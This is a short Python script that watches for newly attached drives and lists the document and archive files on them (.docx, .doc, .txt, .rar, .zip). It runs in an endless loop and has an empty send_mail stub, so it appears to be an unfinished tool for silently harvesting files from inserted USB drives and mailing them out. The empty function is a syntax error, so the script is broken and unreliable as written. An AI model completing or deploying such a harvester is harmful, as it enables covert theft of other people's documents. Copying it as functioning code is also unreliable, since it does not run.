from os.path import exists
import os
import time
from datetime import datetime as dt
from os import listdir
from os.path import isfile, join


def drives():
    drive_list = []
    for drive in range(ord('A'), ord('N')):
        if exists(chr(drive) + ':'):
            drive_list.append(chr(drive))
    return drive_list


def find_docx(direct='F'):

    for root, dirs, files in os.walk(direct + ':\\'):
        for file in files:
            if (file.endswith(file_ext)):
                print(os.path.join(root, file))


def send_mail(email):


def disk_checker(list_drive_new=[]):
    for drive in range(ord('A'), ord('N')):
        if not exists(chr(drive) + ':'):
            if chr(drive) in list_drive_new:
                list_drive_new.remove(chr(drive))

        elif exists(chr(drive) + ':'):
            if (chr(drive) not in list_drive) and (chr(drive) not in list_drive_new):

                # if disk new, we`ll search docx file in drive
                list_drive_new.append(chr(drive))
                find_docx(chr(drive))



# configuration
file_ext = ('.docx', '.doc', '.txt', '.rar', '.zip')
list_drive = ('C', 'D', 'G')


while True:
    disk_checker()
    time.sleep(5)
